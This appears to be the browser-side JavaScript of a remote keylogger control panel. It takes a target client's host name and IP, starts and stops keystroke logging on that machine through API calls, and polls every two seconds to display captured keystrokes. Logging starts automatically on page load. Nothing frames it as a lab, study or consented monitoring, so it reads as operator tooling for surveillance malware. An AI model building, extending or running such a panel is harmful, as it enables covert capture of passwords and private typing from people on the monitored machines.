// language: JavaScript, file: public/js/keylog.js
const $ = (id) => document.getElementById(id);
const params = new URLSearchParams(location.search);
const clientId = Number(params.get('id'));
const hostName = params.get('host') || `client ${clientId}`;
const hostIp   = params.get('ip') || '';
$('target').textContent = `${hostName} @ ${hostIp}`;

let running = false;
let lastSeenId = 0;
let timer = null;

async function toggle() {
  if (running) {
    await fetch(`/api/clients/${clientId}/keylog/stop`, { method: 'POST' });
    running = false;
    $('toggle').textContent = 'start logging';
    $('toggle').classList.remove('on');
    $('dot').classList.remove('on');
    stopPolling();
  } else {
    await fetch(`/api/clients/${clientId}/keylog/start`, { method: 'POST' });
    running = true;
    $('toggle').textContent = 'stop logging';
    $('toggle').classList.add('on');
    $('dot').classList.add('on');
    startPolling();
  }
}

async function poll() {
  try {
    const r = await fetch(`/api/clients/${clientId}/keylog`);
    if (!r.ok) return;
    const rows = await r.json();
    for (const row of rows) {
      if (row.id <= lastSeenId) continue;
      lastSeenId = row.id;
      append(row);
    }
  } catch {}
}

function append(row) {
  const el = document.createElement('div');
  el.className = 'chunk';
  const t = new Date(row.created_at).toLocaleTimeString();
  el.innerHTML = `<span class="t">[${t}]</span> ${escapeHtml(row.data)}`;
  $('log').appendChild(el);
  $('log').scrollTop = $('log').scrollHeight;
}

function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;',
  }[c]));
}

function startPolling() {
  stopPolling();
  timer = setInterval(poll, 2000);
  poll();
}

function stopPolling() {
  if (timer) { clearInterval(timer); timer = null; }
}

$('toggle').addEventListener('click', toggle);
$('clear').addEventListener('click', async () => {
  if (!confirm('clear keylog for this client?')) return;
  await fetch(`/api/clients/${clientId}/keylog`, { method: 'DELETE' });
  $('log').innerHTML = '';
  lastSeenId = 0;
});
$('close').addEventListener('click', () => window.close());

function beaconStop() {
  if (!running) return;
  try { navigator.sendBeacon(`/api/clients/${clientId}/keylog/stop`, new Blob(['{}'], { type: 'application/json' })); } catch {}
}
window.addEventListener('beforeunload', beaconStop);
window.addEventListener('pagehide', beaconStop);

toggle();